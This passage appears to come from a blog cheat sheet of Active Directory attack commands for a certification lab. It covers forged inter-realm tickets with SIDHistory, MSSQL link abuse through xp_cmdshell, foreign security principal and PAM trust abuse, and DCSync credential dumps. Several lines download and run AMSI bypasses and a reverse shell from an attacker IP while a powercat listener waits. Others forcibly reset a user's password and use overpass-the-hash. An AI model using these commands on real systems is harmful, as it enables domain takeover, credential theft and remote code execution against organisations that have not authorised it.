Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"' -Server domain.local
```


**Create an inter-realm ticket and Inject the SIDHistory**:
```powershell
C:\Users\Public\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:<hash> /service:krbtgt /target:domain.local /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /ticket:C:\Users\Public\domainnet.kirbi" "exit"
```

**Request a TGS for HTTP**:
```powershell
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\domainnet.kirbi /service:HTTP/domain-net.domain.local /dc:dc.domain.local /ptt
winrs -r:domain-net.domain.local cmd
whoami /groups
```

   </div>
  </details>

  <details>
    <summary>MSSQL</summary>
    <div class="content" markdown="1">

**Enumerate database links**:
```powershell
Import-Module .\PowerupSQL-master\PowerupSQL.psd1
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
Get-SQLServerLink -Instance us-mssql.domain.local -Verbose
Get-SQLServerLinkCrawl -Instance us-mssql -Verbose
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
```

**Open a Listener**:
```powershell
. .\powercat.ps1
powercat -l -v -p 443 -t 1000
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/Invoke-PowerShellTcpEx.ps1)"'''
```

**Enable RPC Out and xp_cmdshell with SA permission**:
```powershell
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"
Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""db-sqlsrv"""
Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""db-sqlsrv"""
```

**Now Try to execute commands recursively again**:
```powershell
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
```

**Execute commands in a particular link database**:
```powershell
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.x/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.x/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv
```

   </div>
  </details>

  <details>
    <summary>Foreign Security Principals (FSPs)</summary>
    <div class="content" markdown="1">
 


```powershell
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.x/PowerView.ps1')
Note: Make sure to bypass AMSI before executing powershell commands
Get-ForestTrust
```

**Search for**:

- TrustType: Forest 
- TrustDirection: Bidirectional

```powershell
Find-InterestingDomainAcl -ResolveGUIDs -Domain dbvendor.local
```

> See if any *IdentityReferenceName* has *ActiveDirectoryRights* (GenericAll) to any *ObjectDN*

```powershell
Set-DomainUserPassword -Identity dbxsvc -AccountPassword (ConvertTo-SecureString 'Password@123' -AsPlainText -Force) -Domain dbvendor.local –Verbose
```

**Enumerate FSPs**:
```powershell
Find-ForeignGroup –Verbose
```

**Get-DomainUser**:
```powershell
Get-DomainUser -Domain dbvendor.local | ?{$_.ObjectSid -eq 'S-1-5-21-569087967-1859921580-1949641513-4101'}
```

**Accessing with WINRS**:
```powershell
winrs -r:db-dc.db.local -u:dbvendor\dbxsvc -p:Password@123 "whoami"
```

**Accessing with PowerShell Remote**:
```powershell
$passwd = ConvertTo-SecureString 'Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("dbvendor\dbxsvc", $passwd)
$dbdc = New-PSSession -Computername db-dc.db.local -Credential $creds
Invoke-Command -scriptblock{whoami;hostname} -Session $dbdc
```


   </div>
  </details>

  <details>
    <summary>PAM Trust</summary>
    <div class="content" markdown="1">
 


**Enumerate Foreign Security Principals**:
```powershell
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server domain.local
```

**Find out which group DA it is a member of**:
```powershell
Get-ADGroup -Filter * -Properties Member -Server domain.local | ?{$_.Member -match 'S-1-5-21-2781415573-3701854478-2406986946-500'}
```

> In this case the DA is a member of the built-in administrators group on the target forest

**So we need to grab a DA access**: 
```powershell
C:\AD\Tools\Rubeus.exe asktgt /domain:<domain> /user:administrator /aes256:<hash> /dc:<dc> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\dc.domain.local\C$\Users\Public\InShellProf.dll /Y
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\dc.domain.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
winrs -r:dc.domain.local cmd
C:\Users\Public\RunWithRegistryNonAdmin.bat
```

**Check if PAM trust is enabled**:
```powershell
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
```

**Search for**:

- ForestTransitive : True
- SIDFilteringForestAware : False
- the DistinguishedName


**Use the privileges of DA to extract credentials of DA of the target Forest**:
```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:domain\Administrator /domain:domain.local" "exit"
C:\AD\Tools\Rubeus.exe asktgt /domain:domain.local /user:administrator /aes256:<hash> /dc:<dc> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\dc.domain.local\C$\Users\Public\InShellProf.dll /Y
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\dc.domain.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
winrs -r:dc.domain.local cmd
C:\Users\Public\RunWithRegistryNonAdmin.bat
```

**Enumerate other Forests**:
```powershell
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} -Server production.local
```

**Search for**:

- ForestTransitive : True
- SIDFilteringForestAware : True


**Check the membership of Shadow Security Principals**:
```powershell
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name, member, msDS-ShadowPrincipalSid | fl
```

**Obtain the IP of Forest**:
```powershell
Get-DnsServerZone -ZoneName production.local |fl *
```

**Modify WSMan Trustedhosts property**:
```powershell
Note: Run from an elevated shell
Set-Item WSMan:\localhost\Client\TrustedHosts * -Force
```

**Use PowerShell Remoting**:
```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:administrator /domain:domain.local /ntlm:<hash> /run:powershell.exe" "exit"
Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
```

   </div>
  </details>

  <details>
    <summary>Mindmaps</summary>
    <div class="content" markdown="1">
 

AD Mindmap:

![Alt text](/assets/images/posts/crte/6.png){: .align-center}

AD Recommendations:

![Alt text](/assets/images/posts/crte/7.png){: .align-center}

DACL:

![Alt text](/assets/images/posts/crte/8.png){: .align-center}

Bypass AV:

![Alt text](/assets/images/posts/crte/9.png){: .align-center}

Bloodhound Collector:

![Alt text](/assets/images/posts/crte/10.png){: .align-center} 

  </div>
  </details>
</div>

